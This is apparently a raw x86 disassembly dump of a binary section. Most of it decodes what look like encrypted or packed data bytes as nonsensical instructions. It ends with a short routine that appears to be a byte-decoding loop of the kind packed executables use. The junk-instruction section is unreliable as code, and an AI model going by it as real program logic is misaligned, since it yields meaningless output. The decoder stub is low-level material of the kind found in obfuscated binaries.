  420d9a:	xchg   esi,eax
  420d9b:	mov    edx,0x554613bd
  420da0:	ins    DWORD PTR es:[edi],dx
  420da1:	pop    ebx
  420da2:	xchg   ebx,eax
  420da3:	inc    edi
  420da4:	ja     0x420da5
  420da6:	inc    edi
  420da7:	xchg   edi,eax
  420da8:	out    dx,al
  420da9:	in     al,dx
  420daa:	jbe    0x420e02
  420dac:	iret   
  420dad:	cmp    eax,0xe358a46f
  420db2:	in     eax,0xc6
  420db4:	popa   
  420db5:	push   eax
  420db6:	mov    al,0x34
  420db8:	cdq    
  420db9:	push   DWORD PTR [edi+eiz*8+0x37]
  420dbd:	jb     0x420e25
  420dbf:	push   cs
  420dc0:	gs ins DWORD PTR es:[edi],dx
  420dc2:	mov    ebx,0xed1b9f0b
  420dc7:	loopne 0x420d63
  420dc9:	idiv   DWORD PTR [ebx-0x23]
  420dcc:	add    DWORD PTR [edx-0x6503b4eb],esp
  420dd2:	les    ecx,FWORD PTR [edi-0x80]
  420dd5:	(bad)  [ebp-0x396ba921]
  420ddb:	and    DWORD PTR [ebx-0x65b98b23],ebp
  420de1:	pop    ebp
  420de2:	mov    dh,0x2a
  420de4:	pop    eax
  420de5:	adc    edx,DWORD PTR [ecx]
  420de7:	jno    0x420d8e
  420de9:	sbb    al,0x9
  420deb:	test   BYTE PTR [ebp+0x9927d55],al
  420df1:	adc    dh,ah
  420df3:	cmovo  edi,DWORD PTR [ecx-0x261532a3]
  420dfa:	add    dh,BYTE PTR [esi]
  420dfc:	or     cl,bl
  420dfe:	sahf   
  420dff:	lods   eax,DWORD PTR ds:[esi]
  420e00:	aas    
  420e01:	jl     0x420d8f
  420e03:	(bad)  
  420e04:	jp     0x420d95
  420e06:	inc    eax
  420e07:	jbe    0x420da6
  420e09:	jno    0x420da4
  420e0b:	mov    al,ds:0xdb45307c
  420e10:	lea    edx,[eax+0x47]
  420e13:	(bad)  
  420e14:	cmp    BYTE PTR [esp+ecx*4+0x36],bh
  420e18:	sub    BYTE PTR [ebp+0x2f],cl
  420e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e1c:	ja     0x420e4f
  420e1e:	mov    ?,edx
  420e20:	ja     0x420df0
  420e22:	imul   ecx,esp,0xffffffa6
  420e25:	scas   al,BYTE PTR es:[edi]
  420e26:	xor    eax,0xc3f24586
  420e2b:	push   edx
  420e2c:	push   cs
  420e2d:	loopne 0x420df5
  420e2f:	mul    DWORD PTR [ecx]
  420e31:	inc    eax
  420e32:	push   ebp
  420e33:	pop    edi
  420e34:	or     dh,BYTE PTR [esi]
  420e36:	aaa    
  420e37:	and    dh,dl
  420e39:	iret   
  420e3a:	jo     0x420eb4
  420e3c:	std    
  420e3d:	je     0x420dd8
  420e3f:	(bad)  
  420e41:	clc    
  420e42:	clc    
  420e43:	cli    
  420e44:	jo     0x420dfe
  420e46:	pop    eax
  420e47:	fs jge 0x420e9c
  420e4a:	xchg   esp,eax
  420e4b:	xchg   esi,ebx
  420e4d:	dec    ecx
  420e4e:	int3   
  420e4f:	sub    esi,eax
  420e51:	in     al,0xa0
  420e53:	mov    ch,0xa9
  420e55:	push   es
  420e56:	cmc    
  420e57:	xchg   edx,eax
  420e58:	sub    al,0xd0
  420e5a:	loopne 0x420e8d
  420e5c:	mov    ah,0x3a
  420e5e:	mov    cl,0xbc
  420e60:	loop   0x420e56
  420e62:	push   cs
  420e63:	mov    esi,DWORD PTR [ebx]
  420e65:	cmp    al,0xbb
  420e67:	call   0x3221:0x8b13b20e
  420e6e:	fmul   QWORD PTR [edi-0x56]
  420e71:	xor    al,0xf2
  420e73:	pop    esi
  420e74:	mov    dh,0xe4
  420e76:	xor    BYTE PTR [eax+0x67],bh
  420e79:	idiv   DWORD PTR [ebp-0x3a]
  420e7c:	xor    DWORD PTR [edi+0x38],0x30
  420e80:	pop    esp
  420e81:	lahf   
  420e82:	xlat   BYTE PTR ds:[ebx]
  420e83:	repz dec esp
  420e85:	fist   DWORD PTR [ebx+0xaa8c00]
  420e8b:	sbb    DWORD PTR [ebp+0x5a605ece],esp
  420e91:	add    al,0xf
  420e93:	xor    al,0x41
  420e95:	ret    0xf5a
  420e98:	iret   
  420e99:	or     ebx,DWORD PTR [ebp+0x73]
  420e9c:	daa    
  420e9d:	pushf  
  420e9e:	out    dx,al
  420e9f:	mov    ecx,0x6e2b266f
  420ea4:	push   es
  420ea5:	fidivr DWORD PTR [ecx+0x59f86a92]
  420eab:	inc    esp
  420eac:	xchg   esp,eax
  420ead:	mov    gs:0x87f495b6,al
  420eb3:	dec    edi
  420eb4:	sahf   
  420eb5:	and    bh,dl
  420eb7:	enter  0x5d54,0xbf
  420ebb:	cmc    
  420ebc:	mov    ds:0x6d6646d,eax
  420ec1:	push   esi
  420ec2:	mov    ebx,0xd3188738
  420ec7:	push   ss
  420ec8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ec9:	add    dl,dl
  420ecb:	push   0x355f8217
  420ed0:	mov    edx,0xfb2d4326
  420ed5:	adc    DWORD PTR [eax],ecx
  420ed7:	mov    edx,0x4d16fb4a
  420edc:	mov    ecx,0xd983a9bc
  420ee1:	push   ebp
  420ee2:	out    dx,eax
  420ee3:	inc    edx
  420ee4:	fdiv   QWORD PTR [esi-0x6394c8cc]
  420eea:	pop    ds
  420eeb:	ja     0x420e79
  420eed:	push   ss
  420eee:	and    ecx,esi
  420ef0:	mov    edi,0x1584fea1
  420ef5:	push   es
  420ef6:	mov    ecx,0x736c899
  420efb:	pop    edx
  420efc:	in     al,dx
  420efd:	sti    
  420efe:	mov    ah,0x9e
  420f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f01:	aaa    
  420f02:	push   ebx
  420f03:	mov    esi,0xa6bc4545
  420f08:	call   0x3237:0x89edf056
  420f0f:	add    BYTE PTR [ecx-0x2c],0xf
  420f13:	mov    DWORD PTR [ebx+0x43c827c],0x121fcbf9
  420f1d:	dec    eax
  420f1e:	pop    eax
  420f1f:	fiadd  WORD PTR [ebp-0x5f16f55]
  420f25:	fnsave [eax]
  420f27:	(bad)  [esi]
  420f29:	jmp    0x420f33
  420f2b:	push   0xff91927f
  420f30:	mov    esp,0x442c07ab
  420f35:	cdq    
  420f36:	fild   DWORD PTR [edx-0xc]
  420f39:	mov    dh,0x8b
  420f3b:	sar    DWORD PTR [ecx-0x19],1
  420f3e:	(bad)  
  420f40:	or     DWORD PTR es:[edx-0x56],0x2e
  420f45:	inc    eax
  420f46:	aas    
  420f47:	ja     0x420f83
  420f49:	jne    0x420f9c
  420f4b:	imul   ecx,DWORD PTR [eax-0x38],0xf0cbf6a8
  420f52:	mov    ah,0xf4
  420f54:	aas    
  420f55:	sub    bh,bl
  420f57:	sub    BYTE PTR [eax+0x7e8c8933],ah
  420f5d:	loope  0x420ef9
  420f5f:	sbb    eax,DWORD PTR [ebp+0x21]
  420f62:	popf   
  420f63:	mov    ah,0xe0
  420f65:	mov    gs,WORD PTR [eax+0x629afc1c]
  420f6b:	mov    ds:0xc9c23174,al
  420f70:	aas    
  420f71:	cs jns 0x420f29
  420f74:	es scas eax,DWORD PTR es:[edi]
  420f76:	clc    
  420f77:	dec    edx
  420f78:	jno    0x420fc5
  420f7a:	inc    esi
  420f7b:	pop    esp
  420f7c:	xor    DWORD PTR [edx-0x61],0xffffffa7
  420f80:	xor    bh,BYTE PTR [ebp-0x3d29b97e]
  420f86:	and    bl,cl
  420f88:	aam    0x7b
  420f8a:	js     0x420f44
  420f8c:	idiv   BYTE PTR [ebp-0x66]
  420f8f:	dec    esi
  420f90:	ror    BYTE PTR fs:[ebx],1
  420f93:	push   cs
  420f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f95:	cmp    BYTE PTR [ebp-0x1db85fdd],ch
  420f9b:	ds in  eax,0x14
  420f9e:	inc    DWORD PTR [ecx+edi*8]
  420fa1:	rcr    BYTE PTR [esi],cl
  420fa3:	ins    BYTE PTR es:[edi],dx
  420fa4:	lods   al,BYTE PTR ds:[esi]
  420fa5:	test   DWORD PTR [edi-0x257feff3],esi
  420fab:	int    0xf1
  420fad:	retf   
  420fae:	in     eax,dx
  420faf:	dec    ebp
  420fb0:	sti    
  420fb1:	imul   bl
  420fb3:	pushf  
  420fb4:	add    al,bh
  420fb6:	pop    eax
  420fb7:	or     eax,0xb65d57e0
  420fbc:	and    ecx,DWORD PTR [esp+ebx*1+0x61]
  420fc0:	push   ebp
  420fc1:	xlat   BYTE PTR ds:[ebx]
  420fc2:	repnz push edx
  420fc4:	fcom   DWORD PTR es:[ebx+0x5b]
  420fc8:	out    dx,eax
  420fc9:	stc    
  420fca:	mov    bl,0x62
  420fcc:	es cdq 
  420fce:	add    BYTE PTR [edx-0x7b],ch
  420fd1:	inc    edx
  420fd2:	lods   eax,DWORD PTR ds:[esi]
  420fd3:	push   ecx
  420fd4:	xor    ebx,DWORD PTR [edx-0x6e637dab]
  420fda:	mov    ecx,0x4b822ffe
  420fdf:	icebp  
  420fe0:	pusha  
  420fe1:	in     al,dx
  420fe2:	ins    BYTE PTR es:[edi],dx
  420fe3:	and    dl,BYTE PTR [edx-0x6850ff0b]
  420fe9:	push   ebx
  420fea:	sub    BYTE PTR [edx-0x15e6dccb],0x32
  420ff1:	cmp    esp,esp
  420ff3:	mov    al,ds:0xca798d25
  420ff8:	xor    edx,DWORD PTR [edi-0x28bdd5ef]
  420ffe:	sahf   
  420fff:	adc    DWORD PTR [edi-0x638f3751],0x27
  421006:	mov    edi,0x3885fe98
  42100b:	outs   dx,DWORD PTR ds:[esi]
  42100c:	cmp    dl,dl
  42100e:	fild   DWORD PTR [esi+0xb190661]
  421014:	(bad)  
  421015:	lock and BYTE PTR [edx+0x36785d54],ch
  42101c:	mov    al,0x76
  42101e:	rol    BYTE PTR [edx+0x71],0xdb
  421022:	xchg   edx,eax
  421023:	mov    cl,0x8b
  421025:	es and dh,al
  421028:	pop    ds
  421029:	rcl    DWORD PTR [ebx-0x6c847cc],0x3b
  421030:	mov    bl,0xbc
  421032:	cmp    eax,0xb0b5eefc
  421037:	mov    ecx,0xc89279eb
  42103c:	ret    
  42103d:	or     BYTE PTR [edi+eiz*2],dh
  421040:	push   ds
  421041:	add    edi,0xaae39d03
  421047:	dec    ecx
  421048:	addr16 cmp ah,cl
  42104b:	add    eax,0xfd909400
  421050:	push   edi
  421051:	retf   
  421052:	xlat   BYTE PTR ds:[ebx]
  421053:	cmp    eax,0xaefb2b
  421058:	mov    edi,0x8075edaf
  42105d:	ret    0xc4ac
  421060:	sub    eax,DWORD PTR [ebp-0x5f5433f4]
  421066:	mov    ecx,0xd19a515
  42106b:	bound  ecx,QWORD PTR [esi-0x7ec40bf4]
  421071:	icebp  
  421072:	inc    esi
  421073:	aas    
  421074:	out    0x66,al
  421076:	cmp    esi,edx
  421078:	dec    edi
  421079:	leave  
  42107a:	cmp    al,BYTE PTR [esi+0x78]
  42107d:	mov    cl,0x46
  42107f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421080:	push   edi
  421081:	or     DWORD PTR [edx-0x759a55ff],eax
  421087:	sbb    bl,BYTE PTR [edx-0x8]
  42108a:	push   esp
  42108b:	cwde   
  42108c:	jo     0x421026
  42108e:	pop    es
  42108f:	cmc    
  421090:	push   esi
  421091:	xchg   ecx,eax
  421092:	shl    DWORD PTR [edx-0x67ac800e],1
  421098:	jp     0x4210df
  42109a:	add    BYTE PTR [ecx],ah
  42109c:	(bad)  
  42109d:	fst    DWORD PTR [edx+edi*4+0x721c725a]
  4210a4:	arpl   di,cx
  4210a6:	mov    dl,0x9e
  4210a8:	xor    al,0x4b
  4210aa:	loop   0x421098
  4210ac:	pop    es
  4210ad:	dec    esi
  4210ae:	dec    ecx
  4210af:	jg     0x4210a5
  4210b1:	dec    esi
  4210b2:	jno    0x4210fb
  4210b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210b5:	neg    BYTE PTR [eax-0x31]
  4210b8:	push   ss
  4210b9:	retf   
  4210ba:	cli    
  4210bb:	fstp   QWORD PTR [edi+0x7e]
  4210be:	adc    BYTE PTR [eax+0x2b94f37c],cl
  4210c4:	call   0x772a:0x99816fb1
  4210cb:	jmp    0x421126
  4210cd:	int3   
  4210ce:	dec    ebp
  4210cf:	sbb    DWORD PTR [ecx+0x7492bd41],0x41a49158
  4210d9:	inc    ecx
  4210da:	fimul  DWORD PTR [edx]
  4210dc:	jno    0x421152
  4210de:	test   BYTE PTR [eax],bl
  4210e0:	jo     0x421129
  4210e2:	push   ds
  4210e3:	pop    ecx
  4210e4:	pop    ebx
  4210e5:	mov    dl,bh
  4210e7:	and    al,0xaa
  4210e9:	mov    al,0xe2
  4210eb:	daa    
  4210ec:	jle    0x421130
  4210ee:	cdq    
  4210ef:	adc    al,bl
  4210f1:	(bad)  
  4210f2:	jnp    0x42109b
  4210f4:	xchg   DWORD PTR [eax],esi
  4210f6:	mov    esp,0x5a4bfe36
  4210fb:	iret   
  4210fc:	inc    edi
  4210fd:	lock and DWORD PTR [edi],0x7
  421101:	pop    esp
  421102:	aas    
  421103:	mov    ebx,DWORD PTR [edx+eiz*1]
  421106:	add    bl,BYTE PTR [edi-0x7bd1d75f]
  42110c:	push   edx
  42110d:	cli    
  42110e:	mov    cl,0x9a
  421110:	xchg   ebx,eax
  421111:	add    DWORD PTR [ebp-0xaf11e5d],edi
  421117:	stos   DWORD PTR es:[edi],eax
  421118:	sub    eax,0x32767577
  42111d:	popa   
  42111e:	push   eax
  42111f:	push   es
  421120:	stc    
  421121:	ret    0xef0b
  421124:	xchg   BYTE PTR [ecx],bl
  421126:	test   al,0xe
  421128:	out    dx,eax
  421129:	jmp    0x972f:0xa7211154
  421130:	mov    bl,0x3f
  421132:	out    0x3d,eax
  421134:	jno    0x42110d
  421136:	xchg   edi,eax
  421137:	(bad)  
  421138:	ret    
  421139:	sbb    ebp,DWORD PTR [ebp+0x41daaf7b]
  42113f:	mov    cl,0x15
  421141:	int    0x34
  421143:	test   al,0xe8
  421145:	push   eax
  421146:	jp     0x4210e6
  421148:	in     eax,0x98
  42114a:	jle    0x421129
  42114c:	dec    eax
  42114d:	and    al,0xc3
  42114f:	(bad)  [eax-0x7d68c409]
  421155:	nop
  421156:	in     al,dx
  421157:	(bad)  
  421158:	adc    al,0xe0
  42115a:	mov    ebx,0x28f56d1e
  42115f:	mov    bh,0x8d
  421161:	pop    esp
  421162:	ins    DWORD PTR es:[edi],dx
  421163:	mov    ebp,0xcb2cf21f
  421168:	(bad)  
  421169:	in     eax,dx
  42116a:	lock mov eax,ds:0x6d492600
  421170:	clc    
  421171:	inc    edx
  421172:	push   esp
  421173:	mov    al,ds:0xf8fcf5a8
  421178:	cmc    
  421179:	mov    edx,0xf313fcaf
  42117e:	clc    
  42117f:	push   ecx
  421180:	les    ebx,FWORD PTR [ebp-0x360c70a0]
  421186:	in     eax,0x36
  421188:	popf   
  421189:	(bad)  
  42118a:	stc    
  42118b:	inc    edx
  42118c:	xchg   esp,eax
  42118d:	xor    BYTE PTR [ebp+0x39e2bceb],bh
  421193:	clc    
  421194:	adc    dl,0x5e
  421197:	rcl    BYTE PTR [ebx-0x68],1
  42119a:	lock es mov dl,0x8f
  42119e:	out    dx,eax
  42119f:	rcl    DWORD PTR [esi],1
  4211a1:	das    
  4211a2:	idiv   BYTE PTR [ebp+ecx*2-0x54]
  4211a6:	cmp    esp,edx
  4211a8:	into   
  4211a9:	fwait
  4211aa:	int    0x67
  4211ac:	pop    edx
  4211ad:	fsub   DWORD PTR [esi+esi*4]
  4211b0:	lea    eax,[ecx+0x5f]
  4211b3:	loopne 0x4211e5
  4211b5:	daa    
  4211b6:	ror    edx,1
  4211b8:	sbb    al,0x1a
  4211ba:	cwde   
  4211bb:	dec    edx
  4211bc:	fist   WORD PTR [ebx+0x6bcb3056]
  4211c2:	mov    ebx,0x909bd33d
  4211c7:	inc    ecx
  4211c8:	imul   esi,DWORD PTR [esi+0x9],0x6408aa40
  4211cf:	jns    0x4211d8
  4211d1:	imul   ebx,DWORD PTR ss:[edx],0xc656ab5a
  4211d8:	shl    DWORD PTR [ebp+0x36b55e50],0xd9
  4211df:	sub    eax,0xc86daf1f
  4211e4:	pushf  
  4211e5:	xchg   edx,eax
  4211e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211e7:	xchg   BYTE PTR [edi+0x43f6811e],bh
  4211ed:	jge    0x42123c
  4211ef:	bound  ebp,QWORD PTR [ebp-0x4b]
  4211f2:	dec    ebx
  4211f3:	xchg   ebx,eax
  4211f4:	retf   0x354b
  4211f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211f8:	add    BYTE PTR [esi],al
  4211fa:	les    edi,FWORD PTR [edi+0x1c]
  4211fd:	mov    al,0x81
  4211ff:	add    DWORD PTR [ebx-0x39],esi
  421202:	jne    0x4211c5
  421204:	xchg   ecx,eax
  421205:	cmc    
  421206:	loop   0x42127e
  421208:	clc    
  421209:	add    BYTE PTR [eax],dh
  42120b:	retf   0xa654
  42120e:	adc    al,BYTE PTR [esi+eiz*8]
  421211:	(bad)  
  421212:	aam    0x80
  421214:	xchg   ebp,eax
  421215:	pop    edi
  421216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421217:	mov    ebp,0xeb1b05e1
  42121c:	cmp    bh,BYTE PTR [esi-0x11]
  42121f:	cmp    ebx,0xc98c5648
  421225:	push   0xbafdcd68
  42122a:	push   ecx
  42122b:	int    0xed
  42122d:	adc    DWORD PTR [edx+edi*8+0x2908a1b],0xb2995158
  421238:	xchg   esi,eax
  421239:	hlt    
  42123a:	pop    ss
  42123b:	sub    DWORD PTR [eax+0x66],edx
  42123e:	out    dx,al
  42123f:	in     eax,dx
  421240:	push   eax
  421241:	dec    eax
  421242:	scas   eax,DWORD PTR es:[edi]
  421243:	in     eax,dx
  421244:	(bad)  
  421245:	aad    0x6a
  421247:	jne    0x4211de
  421249:	sub    BYTE PTR [edi],ch
  42124b:	mov    ecx,0xb02522ce
  421250:	mov    al,ds:0xfdcc406f
  421255:	push   0x17
  421257:	shr    ah,1
  421259:	test   al,0x30
  42125b:	lahf   
  42125c:	cmp    eax,0x337a2cd1
  421261:	sbb    edi,esi
  421263:	pop    esp
  421264:	and    dh,BYTE PTR [esi-0x43ca3818]
  42126a:	fdivr  QWORD PTR [esi-0x26]
  42126d:	ficom  WORD PTR [edx-0x4ea48677]
  421273:	(bad)  
  421274:	cmp    ch,dh
  421276:	xor    edi,DWORD PTR [edi+0x146ad408]
  42127c:	hlt    
  42127d:	jge    0x42125b
  42127f:	push   ecx
  421280:	sete   BYTE PTR [ebx-0x7d]
  421284:	jnp    0x42123c
  421286:	retf   
  421287:	fidivr WORD PTR [ecx+0x4a23d3a]
  42128d:	(bad)  
  42128f:	push   ss
  421290:	xchg   edx,eax
  421291:	cmp    al,0xf8
  421293:	mov    eax,0xe1d2868e
  421298:	sbb    al,0xd8
  42129a:	fdecstp 
  42129c:	stc    
  42129d:	mov    eax,DWORD PTR [esi-0x2a]
  4212a0:	mov    WORD PTR [eax-0x7573761c],cs
  4212a6:	mov    esp,0xe756ca6c
  4212ab:	cmp    edx,ebx
  4212ad:	xor    al,0xd2
  4212af:	mov    cl,0x98
  4212b1:	mov    al,cs:0x990047d
  4212b7:	test   esp,0x783c6b9d
  4212bd:	and    cl,BYTE PTR [ebp+edx*1+0x4a]
  4212c1:	dec    edx
  4212c2:	mov    dl,0x5a
  4212c4:	cmp    BYTE PTR [ecx],al
  4212c6:	push   ecx
  4212c7:	gs shr dh,cl
  4212ca:	inc    edi
  4212cb:	cmp    al,0x26
  4212cd:	fucom  st(1)
  4212cf:	mov    esp,0xe3442a1f
  4212d4:	mov    edx,0x22b6b682
  4212d9:	into   
  4212da:	popf   
  4212db:	push   es
  4212dc:	pop    edi
  4212dd:	imul   ebx,DWORD PTR [ecx+0x4fbde1ca],0xffffff91
  4212e4:	stos   BYTE PTR es:[edi],al
  4212e5:	mov    bl,0x26
  4212e7:	pusha  
  4212e8:	loope  0x4212a3
  4212ea:	jbe    0x421310
  4212ec:	or     al,0xc6
  4212ee:	or     eax,0x765ef79f
  4212f3:	inc    eax
  4212f4:	or     DWORD PTR [ebx+0x542a659f],edx
  4212fa:	ds sbb ecx,ebx
  4212fd:	adc    ch,BYTE PTR [ecx]
  4212ff:	mov    esp,0x871bcc6c
  421304:	cmp    al,0x91
  421306:	dec    edx
  421307:	sar    DWORD PTR [ebp-0x521e3d0e],1
  42130d:	mov    esi,0x3308cdfb
  421312:	inc    esp
  421313:	rcr    BYTE PTR [esi+ebx*4-0x7aef4a60],0xf
  42131b:	fsubr  st,st(1)
  42131d:	xchg   esp,eax
  42131e:	jle    0x42136a
  421320:	fsub   DWORD PTR [ebp+ebx*4-0x21d52834]
  421327:	mov    esp,0xb1d7cc87
  42132c:	push   eax
  42132d:	dec    esp
  42132e:	(bad)  
  42132f:	inc    esi
  421330:	je     0x421399
  421332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421333:	or     ah,dl
  421335:	xchg   edi,eax
  421336:	cmc    
  421337:	arpl   WORD PTR [esi-0xf55fe9],di
  42133d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42133e:	(bad)  
  42133f:	and    edx,DWORD PTR [edx]
  421341:	fmul   st(0),st
  421343:	jno    0x42137d
  421345:	mov    BYTE PTR [edx-0x5f],ah
  421348:	mov    al,ds:0xbb963531
  42134d:	jecxz  0x42138b
  42134f:	mov    edi,0x434ce539
  421354:	xlat   BYTE PTR ds:[ebx]
  421355:	mov    ah,BYTE PTR [edx+0x50]
  421358:	dec    ebx
  421359:	cmc    
  42135a:	push   ss
  42135b:	and    eax,0xf4406255
  421360:	and    DWORD PTR [edx+esi*2+0x6cb7e59b],ecx
  421367:	mov    dl,0xf6
  421369:	xchg   edx,eax
  42136a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42136b:	push   0x5e7b8209
  421370:	rol    DWORD PTR [edi+esi*4],0x8
  421374:	call   0x343f:0x97de3c2e
  42137b:	loop   0x4213b7
  42137d:	adc    al,0x25
  42137f:	adc    al,0x1f
  421381:	inc    eax
  421382:	push   ds
  421383:	xchg   esp,eax
  421384:	out    dx,eax
  421385:	pop    edi
  421386:	pop    edi
  421387:	(bad)  
  421388:	xlat   BYTE PTR ds:[ebx]
  421389:	jb     0x4213f9
  42138b:	mov    ecx,0x3883184a
  421390:	loopne 0x42132f
  421392:	lods   eax,DWORD PTR ds:[esi]
  421393:	jbe    0x421366
  421395:	lods   eax,DWORD PTR ds:[esi]
  421396:	inc    esi
  421397:	sbb    al,0x32
  421399:	or     DWORD PTR [edx-0x31472c91],eax
  42139f:	sbb    dh,bh
  4213a1:	rcr    BYTE PTR [eax-0x2f],cl
  4213a4:	daa    
  4213a5:	(bad)  
  4213a6:	test   eax,0xb1164d6
  4213ab:	icebp  
  4213ac:	hlt    
  4213ad:	lea    ebp,[ebp+0xc]
  4213b0:	stos   DWORD PTR es:[edi],eax
  4213b1:	fbstp  TBYTE PTR [ebx-0x4b]
  4213b4:	jmp    0x95fb:0xee332da5
  4213bb:	lock push ebp
  4213bd:	outs   dx,DWORD PTR ds:[esi]
  4213be:	gs push edx
  4213c0:	mov    ebp,DWORD PTR [edx]
  4213c2:	retf   
  4213c3:	daa    
  4213c4:	fiadd  WORD PTR [ebx+0x169f0391]
  4213ca:	sahf   
  4213cb:	pop    ss
  4213cc:	fdiv   DWORD PTR [esi+ebp*8-0x3a05233c]
  4213d3:	add    BYTE PTR [ebp+0x4f15e275],dh
  4213d9:	sub    ah,BYTE PTR [edx+ecx*8-0x619a3d04]
  4213e0:	out    dx,eax
  4213e1:	stos   DWORD PTR es:[edi],eax
  4213e2:	mov    esi,0x8823366c
  4213e7:	pop    ebp
  4213e8:	(bad)  
  4213e9:	push   ss
  4213ea:	(bad)
  4213ed:	xchg   esp,eax
  4213ee:	jmp    0x9bbeab1a
  4213f3:	xchg   DWORD PTR [ecx+0x7b],esi
  4213f6:	mov    ds:0xb170e660,eax
  4213fb:	dec    ebx
  4213fc:	mov    ch,0x46
  4213fe:	cmp    edi,DWORD PTR [esi+0x2b3e779f]
  421404:	inc    ebp
  421405:	jmp    0xb1e2:0x1143b5cb
  42140c:	scas   eax,DWORD PTR es:[edi]
  42140d:	in     eax,dx
  42140e:	std    
  42140f:	cwde   
  421410:	jbe    0x4213cc
  421412:	pop    esp
  421413:	out    0xf7,al
  421415:	push   ss
  421416:	and    BYTE PTR [eax+0x5c],bl
  421419:	neg    edx
  42141b:	push   ds
  42141c:	ins    BYTE PTR es:[edi],dx
  42141d:	jle    0x421411
  42141f:	xor    esp,eax
  421421:	jbe    0x42147a
  421423:	pop    esp
  421424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421425:	ins    BYTE PTR es:[edi],dx
  421426:	and    ebp,DWORD PTR [edi-0x19]
  421429:	add    dl,BYTE PTR [ebp+0x22da3a38]
  42142f:	iret   
  421430:	mov    ds:0x4f6f180c,al
  421435:	sub    cl,bl
  421437:	dec    ebp
  421438:	clc    
  421439:	mov    esp,0x8b10a3d5
  42143e:	xchg   esp,eax
  42143f:	loope  0x4213dd
  421441:	imul   esi,DWORD PTR [ebx-0x57fc7d10],0x4
  421448:	adc    DWORD PTR [edi+0x2233a65a],ecx
  42144e:	push   ss
  42144f:	pop    edi
  421450:	jae    0x42143a
  421452:	ror    ch,1
  421454:	add    eax,0x4943ae9b
  421459:	xor    DWORD PTR [eax],edx
  42145b:	jl     0x4213e9
  42145d:	mov    bh,0x1
  42145f:	or     DWORD PTR [edx],ebx
  421461:	cmp    al,0x16
  421463:	push   cs
  421464:	ds aam 0x43
  421467:	mov    DWORD PTR [edi-0x6c],esp
  42146a:	cmc    
  42146b:	cmp    esi,DWORD PTR [ebx+ebp*1]
  42146e:	add    bh,BYTE PTR [esi-0x13]
  421471:	mov    eax,ds:0xb017401
  421476:	ja     0x42142c
  421478:	mov    gs,WORD PTR [ecx+0x1e]
  42147b:	cs jg  0x4214c0
  42147e:	fist   WORD PTR [esi-0x5a]
  421481:	repnz adc al,0xcc
  421484:	xor    ch,ch
  421486:	test   BYTE PTR [ebx-0x77],bl
  421489:	sub    eax,0x9a24762d
  42148e:	and    DWORD PTR [ecx-0x3a],esi
  421491:	ja     0x4214d5
  421493:	clc    
  421494:	mov    al,ds:0x69101276
  421499:	das    
  42149a:	xor    ebx,DWORD PTR [edi+0x4c]
  42149d:	inc    ecx
  42149e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42149f:	loop   0x4214f8
  4214a1:	jmp    0x6ad09f61
  4214a6:	adc    ebp,DWORD PTR [ebp-0x737d63]
  4214ac:	mov    esi,0xef488d02
  4214b1:	inc    eax
  4214b2:	mov    WORD PTR [esi-0x2a],?
  4214b5:	fld    QWORD PTR ds:0x11c1b6fe
  4214bb:	sub    ebx,DWORD PTR [edi+edx*2]
  4214be:	mov    DWORD PTR [ecx+eax*8+0x7408c989],edi
  4214c5:	(bad)
  4214c8:	test   al,0x33
  4214ca:	rol    bl,0x90
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
